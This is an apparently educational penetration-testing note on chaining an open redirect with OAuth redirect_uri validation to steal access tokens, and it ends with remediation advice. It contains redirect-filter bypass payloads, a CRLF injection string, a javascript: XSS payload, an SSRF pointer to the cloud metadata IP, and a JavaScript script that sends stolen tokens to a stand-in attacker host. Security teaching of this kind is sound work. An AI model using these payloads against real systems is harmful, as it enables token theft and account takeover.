---
tags: [chaining, advanced, real-world, vapt]
difficulty: expert
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.18 Chain Open Redirect to API Takeover"
---

# 60.18 - Chain Open Redirect to API Takeover

## 1. Introduction to Open Redirect Exploitation

Open Redirects are frequently dismissed by bug bounty triagers and security teams as low-impact vulnerabilities—often categorized as mere "phishing enablers." This is a dangerous misconception. When an Open Redirect vulnerability exists within an ecosystem that heavily relies on OAuth 2.0, Single Sign-On (SSO), or token-based API authentication, it can be seamlessly weaponized to steal highly privileged access tokens, resulting in a complete API Takeover.

An Open Redirect occurs when an application accepts a user-controlled input that specifies a URL to redirect to, and fails to adequately validate or sanitize that input. The application then issues an HTTP `302 Found` or `301 Moved Permanently` response, instructing the victim's browser to navigate to the attacker's supplied URL.

## 2. The Vulnerability Mechanism: OAuth 2.0 Misconfigurations

The core of this chaining technique lies in how OAuth 2.0 and OIDC (OpenID Connect) handle the `redirect_uri` parameter.

In a standard OAuth authorization flow, a user clicks "Log in with Example Corp", and is directed to an Authorization Server:
`GET /authorize?client_id=123&response_type=token&redirect_uri=https://app.target.com/callback`

The Authorization Server validates that `https://app.target.com/callback` is registered and explicitly allowed for the `client_id`. If successful, the server redirects the user back to the `redirect_uri` with the sensitive token appended (either in the query string or URL fragment):
`HTTP/1.1 302 Found`
`Location: https://app.target.com/callback#access_token=eyJhbG...`

### The Exploit Vector
If the allowed `redirect_uri` domain (`app.target.com`) contains an Open Redirect vulnerability, the attacker can supply the Open Redirect endpoint as the `redirect_uri` in the initial OAuth request. The Authorization Server trusts `app.target.com`, issues the token, and redirects the user to the Open Redirect endpoint, which in turn forwards the token to the attacker's server.

## 3. Attack Architecture and Flow Diagram

Below is the visual flow of an OAuth token leakage via Open Redirect chaining.

```text
 [ Attacker ]
    | (1) Crafts malicious OAuth login link:
    | ?client_id=123&redirect_uri=https://app.target.com/logout?next=https://evil.com
    |
 [ Victim ] -> Clicks the malicious link
    |
    v
 [ OAuth Auth Server (auth.target.com) ]
    |
    | (2) Validates redirect_uri starts with "https://app.target.com" -> VALID!
    | (3) User logs in and authorizes the app.
    | (4) Auth server generates access_token.
    |
    |  +---------------------------------------------------------------------------------+
    |  | HTTP/1.1 302 Found                                                              |
    |  | Location: https://app.target.com/logout?next=https://evil.com#token=SECRET_KEY  |
    |  +---------------------------------------------------------------------------------+
    v
 [ Victim Browser ]
    |
    | (5) Follows redirect to app.target.com/logout
    v
 [ Target Application (app.target.com) ]
    |
    | (6) Processes the Open Redirect parameter (?next=https://evil.com)
    |
    |  +---------------------------------------------------------------------------------+
    |  | HTTP/1.1 302 Found                                                              |
    |  | Location: https://evil.com#token=SECRET_KEY                                     |
    |  +---------------------------------------------------------------------------------+
    v
 [ Victim Browser ]
    |
    | (7) Follows redirect to evil.com, carrying the fragment hash (#token=SECRET_KEY)
    v
 [ Attacker Server (evil.com) ]
    |
    | (8) JavaScript on evil.com extracts the token from window.location.hash
    | (9) Attacker uses token to completely take over the victim's API session
```

## 4. Bypassing Redirect Filters

Finding an Open Redirect is often a game of bypassing poorly implemented filters. Developers frequently use simple string matching or regex that can be trivially defeated.

### 4.1 Filter Bypass Techniques
1. **Double Slashes (Protocol Relative URL):**
   - Filter blocks `http://` and `https://`
   - Payload: `?redirect=//evil.com`
2. **Backslashes:**
   - Browsers will often autocorrect backslashes to forward slashes.
   - Payload: `?redirect=\\evil.com` or `?redirect=/\/evil.com`
3. **URL Encoding / Double Encoding:**
   - Payload: `?redirect=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d`
4. **Parameter Pollution:**
   - Passing the parameter multiple times.
   - Payload: `?redirect=https://valid.com&redirect=https://evil.com`
5. **CRLF Injection:**
   - Injecting carriage return and line feed characters.
   - Payload: `?redirect=https://valid.com%0d%0aLocation:%20https://evil.com`

## 5. Exploitation Scenario: Fragment vs Query String

A critical nuance in this attack chain is how the OAuth token is transmitted. 

### Implicit Flow (Fragment)
In the OAuth 2.0 Implicit Flow (`response_type=token`), the access token is returned in the URI fragment (`#token=xyz`). Fragments are **never** sent to the server in HTTP requests. Therefore, when the browser hits the Open Redirect, the server never sees the `#token=xyz` part. However, browsers preserve the fragment across redirects. When the browser is redirected to `https://evil.com`, it appends the fragment: `https://evil.com#token=xyz`. The attacker must serve an HTML page with JavaScript to read `window.location.hash` and exfiltrate the token.

**Attacker Exfiltration Script (`https://evil.com/index.html`):**
```html
<script>
    var hash = window.location.hash;
    if (hash) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://attacker-log.com/log?" + hash.substring(1), true);
        xhr.send();
    }
</script>
```

### Authorization Code Flow (Query)
In the Authorization Code Flow (`response_type=code`), an authorization code is returned in the query string (`?code=xyz`). Query strings are sent to the server. If the Open Redirect preserves query parameters, the attacker's server will log the code directly in its access logs:
`GET /?next=https://evil.com&code=xyz HTTP/1.1`
The attacker must quickly exchange this code for an access token before it expires (usually within minutes).

## 6. Remediation and Secure Architecture

To break this chain, the Open Redirect vulnerability must be fixed, and the OAuth implementation hardened.

1. **Strict Redirect Validation:** Avoid dynamic redirects using user-supplied input. If dynamic redirects are absolutely necessary, implement a strict, hardcoded whitelist of allowed relative paths (e.g., `/dashboard`, `/profile`). Do not accept absolute URLs.
2. **Require PKCE (Proof Key for Code Exchange):** For OAuth flows, enforce the use of PKCE. Even if an attacker steals an authorization code via an Open Redirect, they cannot exchange it for an access token without the original `code_verifier` secret, completely nullifying the attack.
3. **Deprecate Implicit Flow:** The OAuth 2.0 Security Best Current Practice document explicitly advises against using the Implicit Flow. Move to Authorization Code flow with PKCE.
4. **Strict `redirect_uri` Whitelisting:** The Authorization server must use exact string matching for `redirect_uri` registration, forbidding wildcards or partial domain matching.

## 7. Chaining Opportunities

- **[[10 - Server-Side Request Forgery (SSRF)]]**: An Open Redirect can often be chained to bypass SSRF filters. If a server fetches a user-provided URL but verifies it belongs to `app.target.com`, providing the Open Redirect URL will satisfy the check, but the server will follow the redirect to an internal IP like `169.254.169.254`.
- **[[06 - Cross-Site Scripting (XSS) in Detail]]**: Chain an Open Redirect using the `javascript:` pseudo-protocol (`?redirect=javascript:alert(1)`) to achieve XSS.
- **[[29 - Advanced Phishing Tactics]]**: Combine an unpatched open redirect with a convincing homoglyph domain for highly effective spear-phishing campaigns.

## 8. Related Notes

- [[15 - OAuth 2.0 and OpenID Connect Vulnerabilities]]
- [[33 - Bypassing WAFs and Input Filters]]
- [[40 - Authentication and Session Management Protocols]]
- [[45 - Exploit Development and Custom Payload Generation]]
